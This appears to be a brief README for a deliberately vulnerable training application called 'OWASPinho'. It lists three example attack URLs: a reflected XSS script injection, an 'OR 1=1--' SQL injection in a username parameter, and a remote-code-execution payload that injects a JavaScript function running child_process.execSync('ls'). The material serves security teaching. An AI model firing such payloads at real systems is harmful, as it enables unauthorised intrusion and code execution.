# OWASPinho


## XSS
```
/?content=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
## SQL Injection
```
/users?username=OR+1=1--&access-token=ASDASD
```
## RCE
```
/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ls').toString();%20}
```